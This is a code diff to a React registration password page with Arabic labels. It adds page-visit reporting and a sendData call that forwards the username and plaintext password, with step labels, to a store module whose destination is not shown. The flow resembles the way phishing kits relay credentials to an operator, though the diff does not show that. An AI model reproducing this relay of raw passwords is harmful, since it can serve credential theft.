@@ -1,8 +1,14 @@
 import { useState } from "react";
+import { useEffect } from "react";
 import { useLocation } from "wouter";
+import { navigateToPage, sendData } from "@/lib/store";
 
 export default function RegisterPassword() {
   const [, navigate] = useLocation();
+
+  useEffect(() => {
+    navigateToPage("تسجيل حساب - كلمة المرور");
+  }, []);
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [confirmPassword, setConfirmPassword] = useState("");
@@ -52,7 +58,15 @@ export default function RegisterPassword() {
     if (!confirmPassword) errs.confirmPassword = "هذا الحقل مطلوب";
     else if (password !== confirmPassword) errs.confirmPassword = "كلمتا المرور غير متطابقتين";
     if (Object.keys(errs).length === 0) {
-      navigate("/register/complete");
+      sendData({
+      data: {
+        "اسم المستخدم": username,
+        "كلمة المرور": password,
+      },
+      current: "تسجيل حساب - كلمة المرور",
+      nextPage: "تسجيل حساب - ربط الحساب",
+    });
+    navigate("/register/complete");
     } else {
       setErrors(errs);
     }
